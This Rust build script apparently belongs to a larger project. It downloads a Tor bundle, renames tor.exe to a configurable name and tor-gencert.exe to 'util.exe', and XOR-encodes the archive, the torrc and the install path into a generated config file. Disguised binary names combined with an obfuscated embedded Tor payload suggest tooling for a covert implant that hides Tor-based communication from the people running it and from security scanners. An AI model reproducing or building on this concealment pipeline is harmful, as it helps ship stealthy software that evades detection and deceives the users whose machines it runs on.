mod src;

extern crate rand;

use std::{fs, error, collections, process, io};
use src::{xor, setting, http};
use std::path::{PathBuf, Path};
use std::fs::File;
use std::io::Write;


const CFG_TEMPLATE: &str = "config.rs.template";
const CFG_DESTINATION: &str = "src/config.rs";

struct BuildSetting {
    key: String,
    windows_url: String,
    windows_dir: String,
    linux_url: String,
    linux_dir: String,
    torrc: String,
    name: String
}

fn main() -> Result<(), Box<dyn error::Error>> {
    let tor_for_win_enabled = cfg!(feature = "tor_for_windows");

    let raw_settings: json::JsonValue = load_settings()?;

    let setting = parse_settings(&raw_settings);

    let platform_tor_dir;
    let tor_url;

    if tor_for_win_enabled {
        platform_tor_dir = &setting.windows_dir;
        tor_url = &setting.windows_url;
    } else {
        platform_tor_dir = &setting.linux_dir;
        tor_url = &setting.linux_url;
    }

    let tor_dir = Path::new(&platform_tor_dir)
        .join(&setting.name)
        .join("App");

    let mut replacements = collections::HashMap::new();

    replacements.insert("@{NAME}", setting.name.clone());
    replacements.insert("@{ENC_KEY}", setting.key.clone());

    let enc_tor_dir = xor::encode(
        &setting.key,
        &String::from(tor_dir.to_str().unwrap())
    );
    replacements.insert("@{ENC_TOR_DIR}", enc_tor_dir);

    let torrc = fs::read_to_string(&setting.torrc)?;
    let enc_torrc = xor::encode(
        &setting.key,
        &torrc
    );
    replacements.insert("@{ENC_TORRC}", enc_torrc);

    replacements.insert("@{ENC_TOR_BUNDLE}", bundle_tor(&tor_url, &setting)?);

    match replace_settings(
        &String::from(CFG_TEMPLATE),
        &replacements
    ) {
        Ok(data) => fs::write(CFG_DESTINATION, data)?,
        Err(error) => return Result::Err(error)
    };

    Ok(())
}

fn bundle_tor(url: &String, setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
    let data = download_and_extract_tor(url, setting)?;
    let bundle = xor::encode_bytes(&setting.key, &data);
    Ok(bundle)
}

fn download_and_extract_tor(url: &String, setting: &BuildSetting) -> Result<Vec<u8>, Box<dyn error::Error>> {
    let mut file = tempfile::NamedTempFile::new()?;

    http::download(url, &mut file.reopen()?)?;

    let dir = tempfile::tempdir()?;
    let path = dir.path().to_owned();

    if cfg!(feature = "tor_for_windows") {
        let mut zip = zip::ZipArchive::new(file)?;
        zip.extract(&dir)?;

        fs::rename(path.join("Tor"), path.join("App"))?;

        fs::rename(
            path.join("App").join("tor.exe"),
            path.join("App").join(format!("{}.exe", &setting.name))
        )?;

        fs::rename(
            path.join("App").join("tor-gencert.exe"),
            path.join("App").join("util.exe")
        )?;

        fs::remove_dir_all(path.join("Data"));
    } else {
        let status = process::Command::new("tar")
            .args(["-xf", file.path().to_str().unwrap()])
            .current_dir(&dir)
            .status()?;

        if !status.success() {
            return Result::Err(String::from("problem extracting archive").into());
        }
    }

    let mut archive = tar::Builder::new(Vec::new());
    archive.append_dir_all(&setting.name, &dir)?;
    let data = archive.into_inner()?;

    Ok(data)
}

fn load_settings() -> Result<json::JsonValue, Box<dyn error::Error>> {
    let source = fs::read_to_string("settings.json")?;
    Ok(json::parse(&source)?)
}

fn replace_settings(
    template: &String,
    replacements: &collections::HashMap<&str, String>
) -> Result<String, Box<dyn error::Error>> {
    let mut config_source = fs::read_to_string(template)?;

    for (pattern, content) in replacements {
        config_source = config_source.replace(pattern, &content);
    }

    Ok(config_source)
}

fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
    let key;
    if raw.has_key("key") {
        key = String::from(
            raw["key"].as_str().unwrap_or_else(|| {
                panic!("key must be a string");
            })
        );
    } else {
        key = xor::secret_key();
    }

    let windows_url = String::from(
        raw["tor_urls"]["windows"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("windows url must be a string");
            })
    );

    let linux_url = String::from(
        raw["tor_urls"]["linux"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("linux url must be a string");
            })
    );

    let windows_dir = String::from(
        raw["tor_dirs"]["windows"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("windows path must be a string");
            })
    );

    let linux_dir = String::from(
        raw["tor_dirs"]["linux"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("linux path must be a string");
            })
    );

    let torrc = String::from(
        raw["torrc"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("torrc must be a string");
            })
    );

    let name = String::from(
        raw["name"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("name must be a string");
            })
    );

    BuildSetting {
        key,
        windows_url,
        windows_dir,
        linux_url,
        linux_dir,
        torrc,
        name
    }
}